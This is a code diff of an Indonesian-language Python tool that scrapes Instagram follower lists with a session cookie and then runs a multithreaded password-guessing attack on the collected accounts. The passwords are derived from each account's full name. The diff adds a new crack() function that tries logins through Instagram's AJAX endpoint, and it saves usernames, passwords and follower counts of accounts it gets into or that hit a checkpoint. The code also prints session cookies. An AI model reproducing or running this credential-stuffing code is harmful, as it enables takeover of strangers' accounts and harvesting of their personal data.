@@ -119,16 +119,6 @@ HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig
 ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
 userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'
 
-try:cek_data = requests.get("http://ip-api.com/json/").json()
-except:cek_data = {'-'}
-try:asal_kota = cek_data["city"]
-except:asal_kota = {'-'}
-try:asal_reg = cek_data["region"]
-except:asal_reg = cek_data['-']
-try:times = cek_data["timezone"]
-except:times = cek_data['-']
-try:city = cek_data["city"]
-except:city = cek_data['-']
 
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 tgl = datetime.datetime.now().day
@@ -197,32 +187,46 @@ def Aset_Ig():
     if os.path.isfile('.Cokies-IG.txt') is True:
         coki = {'cookie': open('.Cokies-IG.txt', 'r').read()}
     else:
-        Tabel1 = f"{H2}01\n02\n03"
-        Tabel2 = f"{P2} Login Menggunakan Cookie ( {H2}Recommended{P2} )\nLogin Menggunakan Usernama Dan Password ( {H2}Recommended{P2} )\nKeluar ({M2} Tools{P2}"
-        Tabel3 = f"{H2}ON\n{H2}ON\n{H2}ON"
-        ColumnTabel = me()
-        ColumnTabel.add_column(f"{P2}NO", style="bold green", justify='center')
-        ColumnTabel.add_column(f"{P2}PILIHAN", style="bold green", justify='center',width=55)
-        ColumnTabel.add_column(f"{P2}STATUS", style="bold green", justify='center')
-        ColumnTabel.add_row(Tabel1,Tabel2, Tabel3)
-        sol().print(ColumnTabel, justify='center',style=f"bold green")
-        LoginMenu = input(f"└──╭➣  Pilih 1 Sampai 3 : ")
-        if LoginMenu in [""]:
-            prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan Sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3)
-        elif LoginMenu in ["1","01"]:
-            raraky = {'cookie':input("\ncookie: ")}
-            if raraky['cookie'] == 'res':
-                coki = {'cookie':find_res()}
-            else:
-                coki = raraky
-        elif LoginMenu in ["2","02"]:
-            username = input(f'└──╭➣ {H}Masukan Username :{H} ')
-            password = input(f'└──╭➣ {H}Masukan Password :{H} ')
-            login_to_instagram(username, password)
-        elif LoginMenu in ["3","03"]:
-            exit()
+        username = input(f'└──╭➣ {H}Masukan Username :{H} ')
+        password = input(f'└──╭➣ {H}Masukan Password :{H} ')
+        url = 'https://www.instagram.com/accounts/login/ajax/'
+        response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
+        csrf_token = response.cookies.get('csrftoken')
+        login_headers = {
+            'User-Agent': generate_random_ua(),
+            'X-CSRFToken': csrf_token,
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.instagram.com/accounts/login/',
+        }
+
+        data = {
+            'username': username,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
+        }
+        login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
+        if login_response.status_code == 200 and 'authenticated' in login_response.json() and login_response.json()['authenticated']:
+            x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
+            usres = ses.get('https://www.instagram.com/push/web/get_push_info').json()['data']['user_id']
+            x_json = x.json()["data"]["user"]
+            pengikut = x_json["edge_followed_by"]["count"]
+            mengikut = x_json["edge_follow"]["count"]
+            postingan = x_json["edge_owner_to_timeline_media"]["count"]
+            cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
+            print(f"\n{B}{username} {password}{N}")
+            print(f"{H}Followers: {O}{pengikut}{N}")
+            print(f"{H}Posts: {O}{postingan}{N}")
+            print(f"{H}Following: {O}{mengikut}{N}")
+            print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
+            print(f"{H}Login successful!{N}")
+            print(f"{H}User ID Akun: {O}{usres}{N}")
+            coki = cookie
         else:
-            prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3)
+            prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"bold green"));os.system('rm -rf .kukis.txt');exit()
+            return False
     try:
         uid = re.search(r'ds_user_id=(\d+)', str(coki['cookie'])).group(1)
         req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()
@@ -304,14 +308,14 @@ def menu():
     colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
     colume_tabel.add_column("STATUS", style="bold green", justify='center')
     colume_tabel.add_row(tabel1, tabel2, tabel3)
-    sol().print(colume_tabel, justify='center', style="bold green")
+    sol().print(colume_tabel, justify='start', style="bold green")
     x = input('└──╭➣ Pilih 1 Sampai 3: ')
     if x in ['01','1']:
         dumps(aset, True)
     elif x in ['02','2']:
         dumps(aset, False)
     elif x in ['00','0']:
-        os.system('rm -rf /sdcard/.Cokies-IG.txt')
+        os.system('rm -rf .Cokies-IG.txt')
         print("berhasil menghapus cookies")
         exit()
 
@@ -348,36 +352,37 @@ def process_user(user, kuki, typess, xyz):
 		Graphql(typess, uid, kuki['cookie'], '')
 
 def Graphql(typess, userid, cokie, after):
-	global xx
-	api = "https://www.instagram.com/graphql/query/"
-	csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
-	mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
-	try:
-		ptk = {
-			"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
-			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-			"cookie": cokie
-		}
-		req = requests.get(api, params=mek, headers=ptk).json()
-		if 'require_login' in req:
-			if len(Uuid) > 0:
-				pass
-			else:
-				exit(f'\n{B}[{b}●{B}]{M} Invalid Cookie')
-		khm = 'edge_followed_by' if typess is True else 'edge_follow'
-		for xyz in req['data']['user'][khm]['edges']:
-			username = xyz['node']['username']
-			xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
-			if xy not in Uuid:
-				xx += 1
-				Uuid.append(xy)
-				print(f'\r    {b}＼{P} Collected ID : {b}{len(Uuid)}', end='')
-		end = req['data']['user'][khm]['page_info']['has_next_page']
-		if end is True:
-			after = req['data']['user'][khm]['page_info']['end_cursor']
-			Graphql(typess, userid, cokie, after)
-	except:
-		pass
+    global xx
+    api = "https://www.instagram.com/graphql/query/"
+    csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
+    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
+    try:
+        ptk = {
+            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "cookie": cokie
+        }
+        req = requests.get(api, params=mek, headers=ptk).json()
+        if 'require_login' in req:
+            if len(Uuid) > 0:
+                pass
+            else:
+                exit(f'\n{B}[{b}●{B}]{M} Invalid Cookie')
+        khm = 'edge_followed_by' if typess is True else 'edge_follow'
+        for xyz in req['data']['user'][khm]['edges']:
+            username = xyz['node']['username']
+            xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
+            if xy not in Uuid:
+                xx += 1
+                Uuid.append(xy)
+                print(f'\r    {b}＼{P} Collected ID : {b}{len(Uuid)}', end='')
+                open('dump.txt', 'w').write('\n'.join(Uuid))
+        end = req['data']['user'][khm]['page_info']['has_next_page']
+        if end is True:
+            after = req['data']['user'][khm]['page_info']['end_cursor']
+            Graphql(typess, userid, cokie, after)
+    except:
+        pass
 
 
 def Metode(): 
@@ -386,31 +391,35 @@ def Metode():
 	print(f'    {b}1{P}. Login Instagram With Metode ({b}WEBS{P}) ')
 	print(f'    {b}2{P}. Login Instagram With Metode ({b}APPS{P}) ')
 	print(f'    {b}3{P}. Login Instagram With Metode ({b}AJAX{P}) ')
+	print(f'    {b}3{P}. Login Instagram With Metode ({b}WWW.I{P}) ')
 	method = input(f'{b}     ╰─{P}›{b} ')
 	if method in ['01','1']: Login_Dengan = "api.instagram.com"
 	elif method in ['02','2']: Login_Dengan = "i.instagram.com"
 	elif method in ['03','3']: Login_Dengan = "www.instagram.com"
+	elif method in ['04','4']: Login_Dengan = "web.instagram.com"
 	else:Login_Dengan = "api.instagram.com"
 	SetCrack()
 
 def SetCrack():
-	print(f" \n{b}[{P}●{b}]{P} Result Save In ")
-	print(f'    {b}＼{P}.RESULTS-INSTAGRAM/{b}{Okc}')
-	print(f'    {b}＼{P}.RESULTS-INSTAGRAM/{b}{Cpc}')
-	print(f" \n{b}[{P}●{b}]{P} Crack Process Begins Turn Off Airplane Mode Every{b} 500 ID\n ")
-	with ThreadPoolExecutor (max_workers=30) as ASF:
-		for i in Uuid:
-			try:
-				username, name = i.split('|')
-				kontol = Password(name)
-				if Login_Dengan == "api.instagram.com":
-					ASF.submit(Crack_api, username, kontol)
-				elif Login_Dengan == "i.instagram.com":
-					ASF.submit(Crack_i, username, kontol)
-				elif Login_Dengan == "www.instagram.com":
-					ASF.submit(crack_ajax, username, kontol)
-			except:pass
-	exit(' \n\n Crack Telah Selesai')
+    print(f" \n{b}[{P}●{b}]{P} Result Save In ")
+    print(f'    {b}＼{P}.RESULTS-INSTAGRAM/{b}{Okc}')
+    print(f'    {b}＼{P}.RESULTS-INSTAGRAM/{b}{Cpc}')
+    print(f" \n{b}[{P}●{b}]{P} Crack Process Begins Turn Off Airplane Mode Every{b} 500 ID\n ")
+    with ThreadPoolExecutor (max_workers=30) as ASF:
+        for i in Uuid:
+            try:
+                username, name = i.split('|')
+                kontol = Password(name)
+                if Login_Dengan == "api.instagram.com":
+                    ASF.submit(Crack_api, username, kontol)
+                elif Login_Dengan == "i.instagram.com":
+                    ASF.submit(Crack_i, username, kontol)
+                elif Login_Dengan == "www.instagram.com":
+                    ASF.submit(crack_ajax, username, kontol)
+                elif Login_Dengan == "web.instagram.com":
+                    ASF.submit(crack, username, kontol)
+            except:pass
+    exit(' \n\n Crack Telah Selesai')
 	
 def Password(name):
 	xxzx = []
@@ -770,6 +779,63 @@ def crack_ajax(username, memek):
 		except requests.exceptions.ConnectionError:
 			time.sleep(20)
 	Loop += 1
+
+def crack(username, memek):
+    global Ok, Cp, Loop
+    bo = random.choice([m, b, k, h, u])
+    sys.stdout.write(f"\r{b}╰─{b}▶◀{b}[{bo}{Loop}{b}/{bo}{str(len(Uuid))}{b}]{b}▶◀{b}[{b}{Ok}{b}]{b}▶◀{b}[{k}{Cp}{b}]{b}▶◀{b}[{bo}{'{:.0%}'.format(Loop/float(len(Uuid)))}{b}]  ")
+    sys.stdout.flush()    
+    for password in memek:
+        try:
+            url = 'https://www.instagram.com/accounts/login/ajax/'
+            response = ses.get('https://www.instagram.com/accounts/login/', headers=headers_log)
+            csrf_token = response.cookies.get('csrftoken')
+            login_headers = {
+                'User-Agent': generate_random_ua(),
+                'X-CSRFToken': csrf_token,
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Referer': 'https://www.instagram.com/accounts/login/',
+            }
+
+            data = {
+                'username': username,
+                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1605155817:{password}',  # Format the password with timestamp
+            }
+
+            login_response = ses.post(url, headers=login_headers, data=data, cookies={'csrftoken': csrf_token})
+            if 'Bearer IGT:2:' in str(login_response.text.replace('\\', '')) and '"pk_id":' in str(login_response.text.replace('\\', '')) or "logged_in_user" in str(login_response.text.replace('\\', '')):
+                x = ses.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s" % username, headers={"user-agent": generate_random_ua(), "x-ig-app-id": '936619743392459'})
+                x_json = x.json()["data"]["user"]
+                pengikut = x_json["edge_followed_by"]["count"]
+                mengikut = x_json["edge_follow"]["count"]
+                postingan = x_json["edge_owner_to_timeline_media"]["count"]
+                cookie = ";".join([key + "=" + value.replace('"', '') for key, value in ses.cookies.get_dict().items()])
+                print(f"\n{B}{username} {password}{N}")
+                print(f"{H}Followers: {O}{pengikut}{N}")
+                print(f"{H}Posts: {O}{postingan}{N}")
+                print(f"{H}Following: {O}{mengikut}{N}")
+                print(f"{B}Cookies:{N}\n{P}{cookie}{N}")
+            elif 'challenge_required' in str(login_response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(login_response.text.replace('\\', '')):
+                Cp += 1
+                post, peng, meng, mail, fullname, fbid, phone = data_target(username)
+                print(f"                                                                ", end='\r')
+                time.sleep(0.10)
+                print(f" {b}╰─{b}▶{P} Fullname  :{k} {fullname} ")
+                print(f" {b}╰─{b}▶{P} Username  :{k} {username} ")
+                print(f" {b}╰─{b}▶{P} Password  :{k} {password} ")
+                print(f" {b}╰─{b}▶{P} Followers :{k} {peng} ")
+                print(f" {b}╰─{b}▶{P} Following :{k} {meng} ")
+                open(f'RESULTS-INSTAGRAM/{Cpc}', 'a').write(f"{username}|{password}|{peng}")
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(20)
+    Loop += 1
 
 if __name__=='__main__':
 	menu()
